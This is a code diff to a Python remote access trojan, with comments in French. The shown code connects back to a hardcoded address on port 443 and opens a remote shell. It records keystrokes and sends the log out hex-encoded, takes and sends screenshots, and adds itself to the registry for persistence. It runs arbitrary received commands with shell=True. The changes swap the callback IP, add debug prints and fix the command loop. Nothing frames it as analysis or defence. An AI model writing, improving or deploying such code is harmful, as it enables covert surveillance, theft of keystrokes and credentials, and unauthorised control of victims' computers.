@@ -61,7 +61,7 @@ def connection():
     while True:
         time.sleep(20)
         try:
-            s.connect(("192.168.1.35", 443))
+            s.connect(("192.168.100.9", 443))
             shell()
             break  # Exit loop after successful shell session
         except socket.error as e:
@@ -99,7 +99,7 @@ def stop_keylogger():
 def send_keystrokes_file():
     try:
         with open(keystroke_file_path, 'rb') as file:
-            file_data = file.read().hex()  # Convertir le fichier en hexadécimal pour l'envoyer
+            file_data = file.read().hex()  # Convertir le fichier en hexadécimal pour l'envoyer   
         sending({"status": "success", "data": file_data})
     except Exception as e:
         sending({"status": "error", "message": str(e)})    
@@ -156,14 +156,18 @@ def shell():
             #traitemment de la commande capture 
             elif command.strip() == "screenshot":
                 try:
+                    print("Attempting to capture screenshot...")  # Debug message
                     screenshot = pyautogui.screenshot()
                     buffer = io.BytesIO()
                     screenshot.save(buffer, format="PNG")
                     buffer.seek(0)
                     sending({"status": "success", "data": buffer.getvalue().hex()})
+                    print("Screenshot captured and sent successfully.")  # Debug message
                 except Exception as e:
+                    print(f"Screenshot capture error: {str(e)}")  # Debug message
                     sending({"status": "error", "message": str(e)})
-                    continue
+                continue
+
                 
               #traitemment de la commande dowload  
             elif command.startswith("download "):
@@ -256,20 +260,17 @@ def shell():
             elif command.strip() == "keylogger stop":
                 # Arrêter l'enregistrement et envoyer le fichier
                 stop_keylogger()
+                time.sleep(1)
                 send_keystrokes_file()
+                
                 continue
             
             elif command.strip() == "persistance":
                 # Appeler la fonction pour ajouter le script au registre
                 response = add_persistence()
                 sending(response)  # Envoyer la réponse au serveur
-            continue
-            
-
-
-
-    
-
+                continue
+        
             # Exécuter toutes les autres commandes
             proc = subprocess.Popen(
                 command, shell=True,
